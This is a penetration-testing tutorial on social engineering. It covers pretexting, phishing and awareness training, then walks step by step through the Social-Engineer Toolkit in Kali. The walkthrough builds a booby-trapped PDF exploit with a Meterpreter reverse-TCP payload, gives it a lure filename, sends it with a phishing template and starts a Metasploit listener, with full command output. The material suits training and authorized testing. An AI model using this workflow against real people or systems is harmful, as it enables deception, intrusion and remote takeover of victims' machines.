### Social Engineering in Information Security

In the realm of information security, it is often said that users are the one vulnerability that can never be fully patched. No matter how robust your security controls may be, if an employee can be persuaded to divulge sensitive company information, all those measures become ineffective. In fact, many of the most notorious hacks have not involved any system exploitation at all.

#### Case Study: Kevin Mitnick

Consider the example of the infamous hacker, Kevin Mitnick. Many of his most famous exploits were achieved simply by walking into a building, convincing the security guard that he had permission to be there, and then walking out with the desired information. This type of attack, known as social engineering, exploits human vulnerabilities such as the desire to be helpful or a lack of awareness about security policies.

#### Types of Social-Engineering Attacks

Social-engineering attacks can range from highly technical to completely non-technical. For instance, a social engineer might purchase a cable guy uniform from a thrift store and gain access to an organization's server room. Alternatively, the IT help desk might receive a frantic call from someone claiming to be an assistant to a high-ranking executive, who has locked themselves out of their webmail account. The help desk worker, wanting to be helpful, might read back the password over the phone or reset it to a default value, even though the caller is not who they claim to be.

Email is a common vector for social-engineering attacks. Phishing emails, which attempt to trick users into giving up sensitive information by posing as a trusted person, are particularly prevalent. These emails can lure targets to visit malicious websites or download harmful attachments. Social-engineering attacks are often the missing element needed to trick users into falling victim to client-side attacks.

#### Importance of Employee Training

Organizations should invest time and effort in training all employees about social-engineering attacks. Regardless of the security technologies in place, employees need to use their workstations and mobile devices to perform their jobs. They will have access to sensitive information and security controls that, if mishandled, could harm the organization. Security-awareness training should cover basic principles like "Don't share your password with anyone" and "Check someone's badge before holding the door to a secure area." It should also include more advanced topics, such as recognizing and avoiding malicious files and USB switchblades.

#### The Social-Engineer Toolkit (SET)

TrustedSec’s Social-Engineer Toolkit (SET) is an open-source, Python-driven tool designed to help you perform social-engineering attacks during penetration tests. SET can create a variety of attacks, including email phishing campaigns and web-based attacks. It comes preinstalled in Kali Linux.

To start SET in Kali Linux, enter `setoolkit` at the command prompt. From the main menu, select option 1 to move to the Social-Engineering Attacks menu. You will be prompted to accept the terms of service.

```bash
root@kali:~# setoolkit
--snip--
Select from the menu:
1) Social-Engineering Attacks
2) Fast-Track Penetration Testing
3) Third Party Modules
--snip--
99) Exit the Social-Engineer Toolkit
set> 1
```

#### Spear-Phishing Attacks

From the Social-Engineering Attacks menu, select option 1 to choose Spear-Phishing Attack Vectors. This allows you to create malicious files for client-side attacks, email them, and automatically set up a Metasploit handler to catch the payload.

```bash
Select from the menu:
1) Spear-Phishing Attack Vectors
2) Website Attack Vectors
3) Infectious Media Generator
4) Create a Payload and Listener
5) Mass Mailer Attack
--snip--
99) Return back to the main menu.
set> 1
```

From the Spear-Phishing Attack Vectors menu, select option 1 to perform a mass email attack. This allows you to send a malicious file to a predefined email address or list of addresses and set up a Metasploit listener for the selected payload.

```bash
1) Perform a Mass Email Attack
2) Create a FileFormat Payload
3) Create a Social-Engineering Template
--snip--
99) Return to Main Menu
set:phishing> 1
```

#### Choosing a Payload

Next, choose a payload. For example, to recreate a PDF attack, select option 12: Adobe util.printf() Buffer Overflow.

```bash
********** PAYLOADS **********
1) SET Custom Written DLL Hijacking Attack Vector (RAR, ZIP)
--snip--
12) Adobe util.printf() Buffer Overflow
--snip--
20) MSCOMCTL ActiveX Buffer Overflow (ms12-027)
set:payloads> 12
```

You will be prompted to choose a payload for your malicious file. Select option 2: Windows Meterpreter Reverse_TCP.

```bash
1) Windows Reverse TCP Shell
2) Windows Meterpreter Reverse_TCP
--snip--
set:payloads> 2
```

#### Setting Options

SET will prompt you for the relevant options for the payload, such as LHOST and LPORT. Set the payload listener to the IP address of Kali Linux and leave the port to connect back on to the default (443).

```bash
set> IP address for the payload listener: 192.168.20.9
set:payloads> Port to connect back on [443]:
[-] Defaulting to port 443...
[-] Generating fileformat exploit...
[*] Payload creation complete.
[*] All payloads get sent to the /usr/share/set/src/program_junk/template.pdf directory
[-] As an added bonus, use the file-format creator in SET to create your attachment.
```

#### Naming Your File

Next, you will be prompted to name your malicious file. Choose option 2 to rename the file and enter the filename `bulbsecuritysalaries.pdf`.

```bash
Right now the attachment will be imported with filename of 'template.whatever'
Do you want to rename the file?
1. Keep the filename, I don't care.
2. Rename the file, I want to be cool.
set:phishing> 2
set:phishing> New filename: bulbsecuritysalaries.pdf
[*] Filename changed, moving on...
```

#### Single or Mass Email

Decide whether to send the malicious file to a single email address or a list of addresses. Choose option 1 for a single email address.

```bash
Social Engineer Toolkit Mass E-Mailer
What do you want to do:
1. E-Mail Attack Single Email Address
2. E-Mail Attack Mass Mailer
99. Return to main menu.
set:phishing> 1
```

#### Creating the Template

When crafting the email, you can use one of SET’s email templates or enter text for one-time use. Choose option 1 for a Pre-Defined Template and select template 5.

```bash
Do you want to use a predefined template or craft a one time email template.
1. Pre-Defined Template
2. One-Time Use Email Template
set:phishing> 1
[-] Available templates:
1: Strange internet usage from your computer
2: Computer Issue
3: New Update
4: How long has it been
5: WOAAAA!!!!!!!!!! This is crazy...
6: Have you seen this?
7: Dan Brown's Angels & Demons
8: Order Confirmation
9: Baby Pics
10: Status Report
set:phishing> 5
```

#### Setting the Target

Enter the target email address and a mail server for delivering the attack email. Use Gmail for this attack by choosing option 1.

```bash
set:phishing> Send email to: PI:EMAIL
1. Use a gmail Account for your email attack.
2. Use your own server or open relay
set:phishing> 1
set:phishing> Your gmail email address: PI:EMAIL
set:phishing> The FROM NAME user will see: Georgia Weidman
Email password:
set:phishing> Flag this message/s as high priority? [yes|no]: no
[!] Unable to deliver email. Printing exceptions message below, this is most likely due to an illegal attachment. If using GMAIL they inspect PDFs and is most likely getting caught.
[*] SET has finished delivering the emails
```

#### Setting Up a Listener

Have SET set up a Metasploit listener to catch the payload if anyone opens the email attachment. Even if you are not familiar with Metasploit syntax, you should be able to use SET to set up this attack based on the options chosen earlier.

```bash
set:phishing> Setup a listener [yes|no]: yes
Easy phishing: Set up email templates, landing pages and listeners in Metasploit Pro's wizard -- type 'go_pro' to launch it now.
=[ metasploit v4.8.2-2014010101 [core:4.8 api:1.0]
+ -- --=[ 1246 exploits - 678 auxiliary - 198 post
+ -- --=[ 324 payloads - 32 encoders - 8 nops
[*] Processing src/program_junk/meta_config for ERB directives.
resource (src/program_junk/meta_config)> use exploit/multi/handler
resource (src/program_junk/meta_config)> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource (src/program_junk/meta_config)> set LHOST 192.168.20.9
LHOST => 192.168.20.9
resource (src/program_junk/meta_config)> set LPORT 443
LPORT => 443
--snip--
resource (src/program_junk/meta_config)> exploit -j
[*] Exploit running as background job.
msf exploit(handler) >
[*] Started reverse handler on 192.168.20.9:443
[*] Starting the payload handler...
```

Now, wait for a curious user to open the malicious PDF and send you a session. Use `ctrl-C` to close the listener and type `exit` to return to the previous menu. Option 99 will take you back to SET’s Social-Engineering Attacks menu.

### Web-Based Attacks

Return to the Social-Engineering Attacks menu and choose option 2 (Website Attack Vectors). This type of attack emulates many social-engineering attacks seen in the wild and is commonly used in penetration tests with a social-engineering component.

You will be presented with a list of web-based attacks:

```bash
1) Java Applet Attack Method
2) Metasploit Browser Exploit Method
```

These methods can be used to create and deploy web-based social-engineering attacks, further enhancing the effectiveness of your penetration testing efforts.
